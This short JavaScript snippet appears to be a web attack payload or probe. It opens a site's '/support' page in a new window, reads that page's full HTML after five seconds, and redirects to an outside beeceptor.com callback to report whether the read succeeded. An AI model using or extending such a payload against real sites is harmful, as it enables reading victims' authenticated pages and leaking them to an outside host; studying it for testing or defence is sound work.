const a = window.open("/support");
setTimeout(() => {
  try {
    const content = a.document.documentElement.outerHTML; 
    document.location = 'https://skavens.free.beeceptor.com/ok'
  } catch (err) {
    document.location = 'https://skavens.free.beeceptor.com/error'
    console.error("Impossible d’accéder au contenu :", err);
  }
}, 5000);
